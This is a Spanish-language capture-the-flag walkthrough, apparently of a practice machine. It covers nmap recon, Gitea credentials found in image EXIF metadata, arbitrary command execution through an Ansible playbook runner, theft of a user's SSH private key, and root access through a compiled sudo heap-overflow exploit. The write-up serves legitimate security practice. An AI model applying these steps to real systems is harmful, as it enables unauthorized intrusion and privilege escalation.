@@ -1,0 +1,127 @@
+maquina cat picture 2
+
+nmap -sC -sV 10.10.52.239
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33f0033626368c2f88952cacc3bc6465 (RSA)
+|   256 4ff3b3f26e0391b27cc053d5d4038846 (ECDSA)
+|_  256 137c478b6ff8f46b429af2d53d341352 (ED25519)
+222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
+| ssh-hostkey: 
+|   256 becb061f330f6006a05a06bf065333c0 (ECDSA)
+|_  256 9f0798926efd2c2db093fafee8950c37 (ED25519)
+
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: no-store, no-transform
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: i_like_gitea=5350794ad70bd391; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=sq_EQLC23v1WfdTb1TVMT5LKEMQ6MTY5MTIxMjM3NTM5MTc3MDM2NQ; Path=/; Expires=Sun, 06 Aug 2023 05:12:55 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 05 Aug 2023 05:12:55 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-">
+|     <head>
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title> Gitea: Git with a cup of tea</title>
+|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Cache-Control: no-store, no-transform
+|     Set-Cookie: i_like_gitea=a3a1a57d138027c9; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=WbET89GTZSSrNH_AfdZsBxvaYf06MTY5MTIxMjM4MjExNjIyNjA5NQ; Path=/; Expires=Sun, 06 Aug 2023 05:13:02 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 05 Aug 2023 05:13:02 GMT
+|_    Content-Length: 0
+
+8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
+|_http-title: Welcome to nginx!
+|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
+
+
+------------------------------------------
+
+explorando en ip:3000/explore encontre el usuario samarium
+
+en la direccion ip/robots.txt encontramos la informacion
+
+User-agent: *
+Disallow: /data/
+Disallow: /dist/
+Disallow: /docs/
+Disallow: /php/
+Disallow: /plugins/
+Disallow: /src/
+Disallow: /uploads/
+
+en la primera imagen de un gato la descargamos y revisamos su info con exiftool y en el titulo nos da una url
+en la cual nos da info para logearse
+
+gitea: port 3000
+user: samarium
+password: TUmhyZ37CLZrhP
+
+ansible runner (olivetin): port 1337
+
+esto nos dio la pass del user que habiamos obtenido previamente
+tambien ingresamos a 
+http://10.10.243.76:1337/
+
+aqui corriendo playbook (lo cual corre un whaomi) descubrimos el usuario bismuth
+editan el code de playbook cambiamos whaomi por ls -la y nos da como resultado
+            "total 56K", 
+            "drwxr-xr-x 8 bismuth bismuth 4.0K Mar 20 08:58 .", 
+            "drwxr-xr-x 3 root    root    4.0K Nov  7  2022 ..", 
+            "drwxr-xr-x 3 bismuth bismuth 4.0K Nov  7  2022 .ansible", 
+            "lrwxrwxrwx 1 bismuth bismuth    9 Nov  7  2022 .bash_history -> /dev/null", 
+            "-rw-r--r-- 1 bismuth bismuth  220 Nov  7  2022 .bash_logout", 
+            "-rw-r--r-- 1 bismuth bismuth 3.7K Nov  7  2022 .bashrc", 
+            "drwx------ 2 bismuth bismuth 4.0K Nov  7  2022 .cache", 
+            "drwxr-x--- 3 bismuth bismuth 4.0K Nov  7  2022 .config", 
+            "-rw-rw-r-- 1 bismuth bismuth   33 Mar 20 08:58 flag2.txt", 
+            "drwx------ 3 bismuth bismuth 4.0K Nov  7  2022 .gnupg", 
+            "-rw------- 1 bismuth bismuth   43 Nov  7  2022 .lesshst", 
+            "drwxrwxr-x 2 bismuth bismuth 4.0K Nov  7  2022 .nano", 
+            "-rw-r--r-- 1 bismuth bismuth  655 Nov  7  2022 .profile", 
+            "drwx------ 2 bismuth bismuth 4.0K Nov  7  2022 .ssh", 
+            "-rw-r--r-- 1 bismuth bismuth    0 Nov  7  2022 .sudo_as_admin_successful", 
+            "-rw-rw-r-- 1 bismuth bismuth  182 Nov  7  2022 .wget-hsts"
+hacemos lo mismo ahora para leer flag2.txt
+obtenemos la flag ahora podemos continuar con ver uqe hay en los directorios como .ssh y .sudo_as_admin_successful
+directorio .ssh
+            "drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .", 
+            "drwxr-xr-x 8 bismuth bismuth 4096 Mar 20 08:58 ..", 
+            "-rw-rw-r-- 1 bismuth bismuth  805 Nov  7  2022 authorized_keys", 
+            "-rw------- 1 bismuth bismuth 1679 Nov  7  2022 id_rsa", 
+            "-rw-r--r-- 1 bismuth bismuth  404 Nov  7  2022 id_rsa.pub", 
+            "-rw-r--r-- 1 bismuth bismuth  222 Nov  7  2022 known_hosts"
+y en -sudo
+-rw-r--r-- 1 bismuth bismuth 0 Nov  7  2022 .sudo_as_admin_successful
+
+leemos los archivos de .ssh 
+obtenemos la id_rsa
+y con el user nos conectamos por ssh
+como sudo -l y sudo -v no funciona, probamos con sudo --version
+
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+
+usamos el exploit de blasty lo descargamos, lo compartimos por un http.server descargamos y corremos usamos la opcion
+sudo-hax-me-a-sandwich 0
+
+obtenemos la ultima flag
+
+6d2a9f8f8174e86e27d565087a28a971
